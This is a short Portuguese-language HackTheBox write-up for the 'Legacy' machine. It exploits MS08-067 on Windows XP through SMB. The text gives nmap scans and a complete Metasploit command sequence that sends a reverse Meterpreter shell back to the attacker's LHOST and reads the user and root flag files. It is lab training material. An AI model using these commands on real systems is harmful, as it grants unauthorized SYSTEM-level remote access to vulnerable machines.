Legacy

HackTheBox, Easy

Legacy é um Windows XP com SMB exposto e vulnerável ao MS08-067 (CVE-2008-4250), um estouro de buffer no serviço Server que dá execução remota como SYSTEM sem nenhuma credencial.

Reconhecimento

Só as portas do RPC e do SMB estão abertas. O smb-os-discovery identifica um Windows XP, e o script de vulnerabilidade do Nmap confirma o MS08-067.

nmap -Pn -n -sT --min-rate 1500 -p- <IP>
nmap -Pn -n -sT -sV -sC -p135,139,445 <IP>
# 445 Windows XP microsoft-ds, message signing disabled
nmap -p445 --script smb-vuln-ms08-067 <IP>
# State: VULNERABLE

Exploração - MS08-067

A falha está na forma como a função NetPathCanonicalize trata caminhos recebidos por RPC sobre SMB. O módulo do Metasploit detecta a versão e o service pack e entrega um Meterpreter como NT AUTHORITY\SYSTEM. O XP não tem whoami, então a confirmação vem do getuid.

msfconsole -q
use exploit/windows/smb/ms08_067_netapi
set RHOSTS <IP>
set LHOST tun0
run
getuid
shell
type "C:\Documents and Settings\john\Desktop\user.txt"
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
